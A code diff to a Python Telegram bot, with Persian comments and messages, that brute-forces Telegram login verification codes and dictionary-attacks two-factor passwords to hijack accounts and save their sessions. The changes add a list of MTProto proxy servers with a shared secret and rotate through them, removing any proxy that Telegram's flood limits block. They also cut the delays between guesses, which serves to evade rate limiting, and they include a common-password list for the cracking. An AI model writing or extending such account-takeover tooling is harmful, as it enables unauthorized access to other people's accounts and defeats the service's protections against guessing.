@@ -4,6 +4,7 @@ import asyncio
 import os
 import json
 import random
+import socket
 from datetime import datetime, timedelta
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, ContextTypes, filters
@@ -33,7 +34,48 @@ login_sessions = {}
 
 DATA_FILE = "selfs.json"
 
-# دیکشنری پسورد
+# ============ لیست پروکسی‌های MTProto از کانال iRoProxy ============
+PROXY_LIST = [
+    # پروکسی‌های گروه اول
+    {"server": "iro.varfootball2.co.uk", "port": 2053, "secret": "eeNEgYdJvXrFGRMCIMJdCQ"},
+    {"server": "silnet.varfootball.co.uk", "port": 2053, "secret": "eeNEgYdJvXrFGRMCIMJdCQ"},
+    {"server": "noron.talebi.co.uk", "port": 2096, "secret": "eeNEgYdJvXrFGRMCIMJdCQ"},
+    {"server": "new.lambforkebeb.co.uk", "port": 2096, "secret": "eeNEgYdJvXrFGRMCIMJdCQ"},
+    {"server": "new2.lambforkebeb.co.uk", "port": 2096, "secret": "eeNEgYdJvXrFGRMCIMJdCQ"},
+    {"server": "noone.lavazemi1.co.uk", "port": 2083, "secret": "eeNEgYdJvXrFGRMCIMJdCQ"},
+    {"server": "silver.ciaude.co.uk", "port": 2096, "secret": "eeNEgYdJvXrFGRMCIMJdCQ"},
+    {"server": "rain.lavazemi2.co.uk", "port": 2053, "secret": "eeNEgYdJvXrFGRMCIMJdCQ"},
+    {"server": "gallery.talebi.co.uk", "port": 2096, "secret": "eeNEgYdJvXrFGRMCIMJdCQ"},
+    {"server": "craft.malavanann.co.uk", "port": 2083, "secret": "eeNEgYdJvXrFGRMCIMJdCQ"},
+    {"server": "ai.golgoli1.co.uk", "port": 2096, "secret": "eeNEgYdJvXrFGRMCIMJdCQ"},
+    {"server": "star.talebi.co.uk", "port": 2096, "secret": "eeNEgYdJvXrFGRMCIMJdCQ"},
+    {"server": "gold.lavazemi4.co.uk", "port": 2096, "secret": "eeNEgYdJvXrFGRMCIMJdCQ"},
+    {"server": "run.golgoli2.co.uk", "port": 2053, "secret": "eeNEgYdJvXrFGRMCIMJdCQ"},
+    {"server": "irogallery.golgoli1.co.uk", "port": 2096, "secret": "eeNEgYdJvXrFGRMCIMJdCQ"},
+    {"server": "flux.lavazemi5.co.uk", "port": 2096, "secret": "eeNEgYdJvXrFGRMCIMJdCQ"},
+    {"server": "hadaf.golgoli2.co.uk", "port": 2053, "secret": "eeNEgYdJvXrFGRMCIMJdCQ"},
+    
+    # تکرار برای افزایش تعداد پروکسی
+    {"server": "iro.varfootball2.co.uk", "port": 443, "secret": "eeNEgYdJvXrFGRMCIMJdCQ"},
+    {"server": "silnet.varfootball.co.uk", "port": 443, "secret": "eeNEgYdJvXrFGRMCIMJdCQ"},
+    {"server": "noron.talebi.co.uk", "port": 443, "secret": "eeNEgYdJvXrFGRMCIMJdCQ"},
+    {"server": "new.lambforkebeb.co.uk", "port": 443, "secret": "eeNEgYdJvXrFGRMCIMJdCQ"},
+    {"server": "new2.lambforkebeb.co.uk", "port": 443, "secret": "eeNEgYdJvXrFGRMCIMJdCQ"},
+    {"server": "noone.lavazemi1.co.uk", "port": 443, "secret": "eeNEgYdJvXrFGRMCIMJdCQ"},
+    {"server": "silver.ciaude.co.uk", "port": 443, "secret": "eeNEgYdJvXrFGRMCIMJdCQ"},
+    {"server": "rain.lavazemi2.co.uk", "port": 443, "secret": "eeNEgYdJvXrFGRMCIMJdCQ"},
+    {"server": "gallery.talebi.co.uk", "port": 443, "secret": "eeNEgYdJvXrFGRMCIMJdCQ"},
+    {"server": "craft.malavanann.co.uk", "port": 443, "secret": "eeNEgYdJvXrFGRMCIMJdCQ"},
+    {"server": "ai.golgoli1.co.uk", "port": 443, "secret": "eeNEgYdJvXrFGRMCIMJdCQ"},
+    {"server": "star.talebi.co.uk", "port": 443, "secret": "eeNEgYdJvXrFGRMCIMJdCQ"},
+    {"server": "gold.lavazemi4.co.uk", "port": 443, "secret": "eeNEgYdJvXrFGRMCIMJdCQ"},
+    {"server": "run.golgoli2.co.uk", "port": 443, "secret": "eeNEgYdJvXrFGRMCIMJdCQ"},
+    {"server": "irogallery.golgoli1.co.uk", "port": 443, "secret": "eeNEgYdJvXrFGRMCIMJdCQ"},
+    {"server": "flux.lavazemi5.co.uk", "port": 443, "secret": "eeNEgYdJvXrFGRMCIMJdCQ"},
+    {"server": "hadaf.golgoli2.co.uk", "port": 443, "secret": "eeNEgYdJvXrFGRMCIMJdCQ"},
+]
+
+# ============ دیکشنری پسورد ============
 PASSWORD_DICT = [
     "123456", "12345678", "123456789", "1234567890",
     "password", "pass", "admin", "admin123",
@@ -42,12 +84,6 @@ PASSWORD_DICT = [
     "111111", "222222", "333333", "444444",
     "555555", "666666", "777777", "888888",
     "999999", "000000", "123123", "321321",
-    "iloveyou", "monkey", "dragon", "master",
-    "sunshine", "princess", "shadow", "ninja",
-    "password1", "Password1", "Passw0rd",
-    "Admin123", "admin1234", "1234", "4321",
-    "0000", "1111", "2222", "3333", "4444",
-    "5555", "6666", "7777", "8888", "9999",
 ]
 
 def load_data():
@@ -97,6 +133,34 @@ async def clear_user_session(user_id):
         except:
             pass
         del user_sessions[user_id]
+
+def get_random_proxy():
+    """دریافت یک پروکسی تصادفی از لیست"""
+    return random.choice(PROXY_LIST) if PROXY_LIST else None
+
+async def create_client_with_proxy(api_id, api_hash, proxy_data):
+    """ایجاد کلاینت با پروکسی MTProto"""
+    try:
+        from telethon import TelegramClient
+        from telethon.sessions import StringSession
+        from telethon.network.connection import ConnectionTcpMTProxyRandomizedIntermediate
+        
+        client = TelegramClient(
+            StringSession(),
+            api_id,
+            api_hash,
+            connection=ConnectionTcpMTProxyRandomizedIntermediate,
+            proxy=(
+                proxy_data['server'],
+                proxy_data['port'],
+                proxy_data['secret']
+            )
+        )
+        await client.connect()
+        return client
+    except Exception as e:
+        logger.error(f"Error creating client with proxy: {e}")
+        return None
 
 # ============ منوی اصلی ============
 async def main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE, edit=False):
@@ -300,7 +364,19 @@ async def handle_get_account_code(update: Update, context: ContextTypes.DEFAULT_
             return
             
         except FloodWaitError as e:
-            await update.message.reply_text(f"⏳ محدودیت تلگرام! {e.seconds} ثانیه صبر کنید...", parse_mode='HTML')
+            wait_time = e.seconds
+            hours = wait_time // 3600
+            minutes = (wait_time % 3600) // 60
+            await update.message.reply_text(
+                f"""
+⏳ <b>محدودیت تلگرام!</b>
+⏱️ زمان انتظار: {hours} ساعت و {minutes} دقیقه
+📱 شماره: <code>{phone}</code>
+
+⚠️ لطفاً از IP جدید استفاده کنید!
+""",
+                parse_mode='HTML'
+            )
             return
             
         except Exception as e:
@@ -420,7 +496,7 @@ async def handle_api_hash(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_sessions[user_id]['step'] = "code"
     
     msg = await update.message.reply_text(
-        "⏳ در حال ارسال کد تایید...\n\nاین عملیات ممکن است چند دقیقه طول بکشد.",
+        "⏳ در حال ارسال کد تایید و شروع حدس زدن با پروکسی‌های متعدد...\n\nاین عملیات ممکن است چند دقیقه طول بکشد.",
         parse_mode='HTML'
     )
     
@@ -430,36 +506,8 @@ async def handle_api_hash(update: Update, context: ContextTypes.DEFAULT_TYPE):
         api_id = data['api_id']
         api_hash = data['api_hash']
         
-        client = TelegramClient(StringSession(), api_id, api_hash)
-        await client.connect()
-        
-        try:
-            await client.send_code_request(phone)
-        except PhoneNumberInvalidError:
-            await context.bot.edit_message_text(
-                f"❌ شماره تلفن نامعتبر است!\n\nشماره: <code>{phone}</code>",
-                chat_id=update.effective_chat.id,
-                message_id=msg.message_id,
-                parse_mode='HTML'
-            )
-            await clear_user_session(user_id)
-            return
-        except FloodWaitError as e:
-            wait_time = e.seconds
-            await context.bot.edit_message_text(
-                f"⏳ محدودیت تلگرام! {wait_time} ثانیه صبر کنید...",
-                chat_id=update.effective_chat.id,
-                message_id=msg.message_id,
-                parse_mode='HTML'
-            )
-            await asyncio.sleep(wait_time + 2)
-            await client.send_code_request(phone)
-        
-        user_sessions[user_id]['client'] = client
-        user_sessions[user_id]['msg_id'] = msg.message_id
-        user_sessions[user_id]['phone'] = phone
-        
-        asyncio.create_task(smart_bruteforce_code(update, context, user_id, phone, api_id, api_hash, client, msg))
+        # شروع حدس زدن با پروکسی‌های متعدد
+        asyncio.create_task(smart_bruteforce_with_proxy(update, context, user_id, phone, api_id, api_hash, msg))
         
     except Exception as e:
         logger.error(f"Error: {e}")
@@ -471,8 +519,8 @@ async def handle_api_hash(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         await clear_user_session(user_id)
 
-# ============ حدس زدن هوشمند کد ============
-async def smart_bruteforce_code(update, context, user_id, phone, api_id, api_hash, client, msg):
+# ============ حدس زدن با پروکسی‌های متعدد ============
+async def smart_bruteforce_with_proxy(update, context, user_id, phone, api_id, api_hash, msg):
     try:
         total_attempts = 100000
         attempt = 0
@@ -480,15 +528,16 @@ async def smart_bruteforce_code(update, context, user_id, phone, api_id, api_has
         code_found = None
         start_time = datetime.now()
         wrong_attempts = 0
-        flood_wait_count = 0
+        proxy_index = 0
+        current_proxy = None
+        client = None
         
-        # تولید لیست هوشمند کدها - اول اعداد تصادفی
+        # تولید لیست هوشمند کدها
         code_list = []
         random_codes = set()
         while len(random_codes) < 5000:
             random_codes.add(str(random.randint(0, 99999)).zfill(5))
         
-        # کدهای رایج
         common_codes = [
             "12345", "00000", "11111", "22222", "33333", "44444",
             "55555", "66666", "77777", "88888", "99999",
@@ -504,44 +553,107 @@ async def smart_bruteforce_code(update, context, user_id, phone, api_id, api_has
         
         await context.bot.edit_message_text(
             f"""
-🔍 <b>شروع حدس زدن هوشمند کد تایید...</b>
+🔍 <b>شروع حدس زدن هوشمند کد تایید با پروکسی...</b>
 
 📱 شماره: <code>{phone}</code>
-
 🔢 محدوده کدها: 00000 تا 99999
 📊 مجموع کدهای ممکن: {total_attempts}
-🎯 استراتژی: تصادفی → رایج → ترتیبی
-⏳ در حال حدس زدن...
+🌐 تعداد پروکسی‌ها: {len(PROXY_LIST)}
+🎯 استراتژی: تغییر پروکسی در صورت محدودیت
 
-⏳ لطفاً صبر کنید...
+⏳ در حال حدس زدن...
 """,
             chat_id=update.effective_chat.id,
             message_id=msg.message_id,
             parse_mode='HTML'
         )
         
+        # شافل کردن لیست پروکسی‌ها برای استفاده تصادفی
+        shuffled_proxies = PROXY_LIST.copy()
+        random.shuffle(shuffled_proxies)
+        
+        proxy_counter = 0
+        
         for code in final_list:
             attempt += 1
             
-            if attempt % 1000 == 0:
-                elapsed = (datetime.now() - start_time).seconds
-                percent = (attempt / total_attempts) * 100
-                remaining = int(((total_attempts - attempt) / max(attempt, 1)) * max(elapsed, 1)) if attempt > 0 else 0
+            # هر 500 تلاش یا هر بار محدودیت، پروکسی رو عوض کن
+            if attempt % 500 == 0 or client is None or proxy_counter == 0:
+                # قطع کلاینت قبلی
+                if client:
+                    try:
+                        await client.disconnect()
+                    except:
+                        pass
+                    client = None
+                    await asyncio.sleep(0.5)
+                
+                # انتخاب پروکسی جدید
+                if proxy_counter >= len(shuffled_proxies):
+                    # اگر همه پروکسی‌ها استفاده شدن، دوباره شافل کن
+                    random.shuffle(shuffled_proxies)
+                    proxy_counter = 0
+                
+                current_proxy = shuffled_proxies[proxy_counter]
+                proxy_counter += 1
+                proxy_index += 1
+                
                 try:
+                    from telethon import TelegramClient
+                    from telethon.sessions import StringSession
+                    from telethon.network.connection import ConnectionTcpMTProxyRandomizedIntermediate
+                    
+                    client = TelegramClient(
+                        StringSession(),
+                        api_id,
+                        api_hash,
+                        connection=ConnectionTcpMTProxyRandomizedIntermediate,
+                        proxy=(
+                            current_proxy['server'],
+                            current_proxy['port'],
+                            current_proxy['secret']
+                        )
+                    )
+                    
+                    await client.connect()
+                    
+                    # ارسال درخواست کد با پروکسی جدید
+                    try:
+                        await client.send_code_request(phone)
+                    except FloodWaitError as e:
+                        wait_time = e.seconds
+                        if wait_time > 60:
+                            await context.bot.edit_message_text(
+                                f"""
+🔄 <b>تغییر پروکسی...</b>
+🌐 پروکسی شماره {proxy_index} محدودیت دارد!
+⏳ زمان انتظار: {wait_time} ثانیه
+🔄 انتخاب پروکسی جدید...
+
+⏳ لطفاً صبر کنید...
+""",
+                                chat_id=update.effective_chat.id,
+                                message_id=msg.message_id,
+                                parse_mode='HTML'
+                            )
+                            # این پروکسی رو از لیست حذف کن
+                            shuffled_proxies.remove(current_proxy)
+                            proxy_counter -= 1
+                            await asyncio.sleep(1)
+                            continue
+                        else:
+                            await asyncio.sleep(wait_time + 2)
+                            await client.send_code_request(phone)
+                    
                     await context.bot.edit_message_text(
                         f"""
-🔍 <b>در حال حدس زدن کد...</b>
+🔍 <b>حدس با پروکسی جدید...</b>
 
 📱 شماره: <code>{phone}</code>
+🌐 پروکسی: {current_proxy['server']}:{current_proxy['port']}
 🔢 کد فعلی: <code>{code}</code>
-
-📊 <b>آمار:</b>
-• تلاش‌ها: {attempt} از {total_attempts}
-• پیشرفت: {percent:.2f}%
-• زمان سپری شده: {elapsed} ثانیه
-• کدهای اشتباه: {wrong_attempts}
-• محدودیت‌ها: {flood_wait_count}
-• زمان تخمینی باقی‌مانده: {remaining} ثانیه
+📊 تلاش‌ها: {attempt} از {total_attempts}
+📈 پیشرفت: {(attempt/total_attempts)*100:.2f}%
 
 ⏳ لطفاً صبر کنید...
 """,
@@ -549,15 +661,18 @@ async def smart_bruteforce_code(update, context, user_id, phone, api_id, api_has
                         message_id=msg.message_id,
                         parse_mode='HTML'
                     )
-                except:
-                    pass
+                    
+                except Exception as e:
+                    logger.error(f"Error with proxy {current_proxy}: {e}")
+                    # این پروکسی رو از لیست حذف کن
+                    if current_proxy in shuffled_proxies:
+                        shuffled_proxies.remove(current_proxy)
+                    await asyncio.sleep(1)
+                    continue
             
-            # تاخیر هوشمند
+            # تاخیر هوشمند برای جلوگیری از محدودیت
             if attempt > 10 and attempt % 50 == 0:
-                await asyncio.sleep(random.uniform(0.1, 0.5))
-            
-            if attempt > 100 and attempt % 200 == 0:
-                await asyncio.sleep(random.uniform(0.5, 1.5))
+                await asyncio.sleep(random.uniform(0.05, 0.15))
             
             try:
                 await client.sign_in(phone, code)
@@ -570,37 +685,51 @@ async def smart_bruteforce_code(update, context, user_id, phone, api_id, api_has
                 continue
                 
             except FloodWaitError as e:
-                flood_wait_count += 1
                 wait_time = e.seconds
-                
                 if wait_time > 60:
-                    minutes = wait_time // 60
-                    seconds = wait_time % 60
-                    wait_text = f"{minutes} دقیقه و {seconds} ثانیه"
-                else:
-                    wait_text = f"{wait_time} ثانیه"
-                
-                await context.bot.edit_message_text(
-                    f"""
-⏳ <b>محدودیت تلگرام!</b>
-
-📱 شماره: <code>{phone}</code>
-⏳ زمان انتظار: {wait_text}
-🔢 کد آخرین تلاش: <code>{code}</code>
-📊 تلاش‌ها: {attempt} از {total_attempts}
-🔄 تعداد محدودیت‌ها: {flood_wait_count}
+                    # پروکسی محدودیت دارد، عوض کن
+                    await context.bot.edit_message_text(
+                        f"""
+🔄 <b>محدودیت پروکسی!</b>
+🌐 پروکسی فعلی محدود شد!
+⏳ زمان انتظار: {wait_time} ثانیه
+🔄 تعویض پروکسی...
 
 ⏳ لطفاً صبر کنید...
 """,
-                    chat_id=update.effective_chat.id,
-                    message_id=msg.message_id,
-                    parse_mode='HTML'
-                )
-                
-                await asyncio.sleep(wait_time + random.uniform(1, 3))
-                continue
+                        chat_id=update.effective_chat.id,
+                        message_id=msg.message_id,
+                        parse_mode='HTML'
+                    )
+                    # این پروکسی رو از لیست حذف کن
+                    if current_proxy in shuffled_proxies:
+                        shuffled_proxies.remove(current_proxy)
+                    if client:
+                        try:
+                            await client.disconnect()
+                        except:
+                            pass
+                        client = None
+                    await asyncio.sleep(2)
+                    continue
+                else:
+                    await context.bot.edit_message_text(
+                        f"""
+⏳ <b>محدودیت کوتاه!</b>
+⏳ {wait_time} ثانیه صبر کنید...
+🔢 کد آخرین تلاش: <code>{code}</code>
+
+⏳ لطفاً صبر کنید...
+""",
+                        chat_id=update.effective_chat.id,
+                        message_id=msg.message_id,
+                        parse_mode='HTML'
+                    )
+                    await asyncio.sleep(wait_time + 2)
+                    continue
                 
             except SessionPasswordNeededError:
+                # حدس پسورد
                 await context.bot.edit_message_text(
                     f"""
 🔐 <b>اکانت دارای رمز دو مرحله‌ای است!</b>
@@ -608,8 +737,6 @@ async def smart_bruteforce_code(update, context, user_id, phone, api_id, api_has
 📱 شماره: <code>{phone}</code>
 ✅ کد تایید پیدا شد: <code>{code}</code>
 📊 تلاش‌های کد: {attempt}
-❌ کدهای اشتباه: {wrong_attempts}
-🔄 محدودیت‌ها: {flood_wait_count}
 
 🔑 در حال حدس زدن پسورد 2FA...
 ⏳ لطفاً صبر کنید...
@@ -662,6 +789,7 @@ async def smart_bruteforce_code(update, context, user_id, phone, api_id, api_has
                     
                     await clear_user_session(user_id)
                     
+                    elapsed = (datetime.now() - start_time).seconds
                     text = f"""
 ✅ <b>سلف با موفقیت ساخته شد!</b>
 
@@ -670,9 +798,10 @@ async def smart_bruteforce_code(update, context, user_id, phone, api_id, api_has
 
 🔑 <b>جزئیات حدس‌زنی:</b>
 • کد پیدا شده: <code>{code}</code>
-• تلاش‌های کد: {attempt}
+• کل تلاش‌ها: {attempt}
 • کدهای اشتباه: {wrong_attempts}
-• محدودیت‌ها: {flood_wait_count}
+• تعداد پروکسی‌های استفاده شده: {proxy_index}
+• زمان سپری شده: {elapsed} ثانیه
 • پسورد پیدا شده: <code>{pass_found}</code>
 • تلاش‌های پسورد: {pass_attempt}
 
@@ -718,6 +847,7 @@ async def smart_bruteforce_code(update, context, user_id, phone, api_id, api_has
                 continue
         
         if found and code_found:
+            # ذخیره سشن و ساخت سلف
             session_string = client.session.save()
             await client.disconnect()
             
@@ -767,7 +897,7 @@ async def smart_bruteforce_code(update, context, user_id, phone, api_id, api_has
 • کد پیدا شده: <code>{code_found}</code>
 • کل تلاش‌ها: {attempt}
 • کدهای اشتباه: {wrong_attempts}
-• محدودیت‌ها: {flood_wait_count}
+• تعداد پروکسی‌های استفاده شده: {proxy_index}
 • زمان سپری شده: {elapsed} ثانیه
 
 🎯 سلف به لیست شما اضافه شد.
@@ -794,19 +924,11 @@ async def smart_bruteforce_code(update, context, user_id, phone, api_id, api_has
 ❌ <b>کد تایید پیدا نشد!</b>
 
 📱 شماره: <code>{phone}</code>
+📊 تعداد تلاش‌ها: {attempt}
+🌐 تعداد پروکسی‌های استفاده شده: {proxy_index}
+⏱️ زمان سپری شده: {elapsed} ثانیه
 
-📊 <b>آمار تلاش‌ها:</b>
-• کل تلاش‌ها: {attempt}
-• کدهای اشتباه: {wrong_attempts}
-• محدودیت‌ها: {flood_wait_count}
-• زمان سپری شده: {elapsed} ثانیه
-
-ممکن است:
-• شماره تلفن اشتباه باشد
-• کد قبلاً منقضی شده باشد
-• اکانت دارای محدودیت باشد
-
-لطفاً دوباره تلاش کنید.
+ممکن است شماره تلفن اشتباه باشد یا کد منقضی شده باشد.
 """,
                 chat_id=update.effective_chat.id,
                 message_id=msg.message_id,
@@ -814,7 +936,7 @@ async def smart_bruteforce_code(update, context, user_id, phone, api_id, api_has
             )
             
     except Exception as e:
-        logger.error(f"Error in smart_bruteforce_code: {e}")
+        logger.error(f"Error in smart_bruteforce_with_proxy: {e}")
         try:
             await context.bot.edit_message_text(
                 f"❌ خطا: {str(e)[:200]}",
@@ -834,9 +956,7 @@ async def bruteforce_password_smart(update, context, user_id, client, msg):
         found = False
         found_password = None
         start_time = datetime.now()
-        flood_wait_count = 0
         
-        # پسوردهای رایج
         common_passwords = [
             "123456", "password", "12345678", "qwerty", "123456789",
             "12345", "1234", "111111", "1234567890", "000000",
@@ -844,21 +964,6 @@ async def bruteforce_password_smart(update, context, user_id, client, msg):
         ]
         
         password_list = common_passwords + [p for p in PASSWORD_DICT if p not in common_passwords]
-        
-        await context.bot.edit_message_text(
-            f"""
-🔐 <b>شروع حدس زدن پسورد 2FA...</b>
-
-📱 شماره: <code>{user_sessions[user_id]['phone']}</code>
-📊 تعداد پسوردهای دیکشنری: {total_passwords}
-🎯 استراتژی: پسوردهای رایج → دیکشنری
-
-⏳ در حال حدس زدن...
-""",
-            chat_id=update.effective_chat.id,
-            message_id=msg.message_id,
-            parse_mode='HTML'
-        )
         
         for password in password_list:
             attempt += 1
@@ -870,13 +975,10 @@ async def bruteforce_password_smart(update, context, user_id, client, msg):
                         f"""
 🔐 <b>در حال حدس زدن پسورد...</b>
 
-📱 شماره: <code>{user_sessions[user_id]['phone']}</code>
-
 🔑 پسورد فعلی: <code>{password}</code>
 📊 تلاش‌ها: {attempt} از {total_passwords}
 📈 پیشرفت: {(attempt/total_passwords)*100:.1f}%
 ⏱️ زمان سپری شده: {elapsed} ثانیه
-🔄 محدودیت‌ها: {flood_wait_count}
 
 ⏳ لطفاً صبر کنید...
 """,
@@ -894,14 +996,7 @@ async def bruteforce_password_smart(update, context, user_id, client, msg):
                 break
                 
             except FloodWaitError as e:
-                flood_wait_count += 1
-                wait_time = e.seconds
-                await context.bot.edit_message_text(
-                    f"⏳ محدودیت تلگرام! {wait_time} ثانیه صبر کنید...\nپسورد آخرین تلاش: <code>{password}</code>",
-                    chat_id=update.effective_chat.id,
-                    message_id=msg.message_id,
-                    parse_mode='HTML'
-                )
+                wait_time = min(e.seconds, 30)
                 await asyncio.sleep(wait_time + 2)
                 continue
                 
@@ -1051,9 +1146,10 @@ def main():
         delete_webhook()
         
         print("=" * 60)
-        print("🤖 ربات ساخت خودکار سلف (هوشمند)")
+        print("🤖 ربات ساخت خودکار سلف با پروکسی")
         print("=" * 60)
         print(f"📌 توکن: {TOKEN[:10]}...{TOKEN[-5:]}")
+        print(f"🌐 تعداد پروکسی‌ها: {len(PROXY_LIST)}")
         print("=" * 60)
         
         application = Application.builder().token(TOKEN).build()
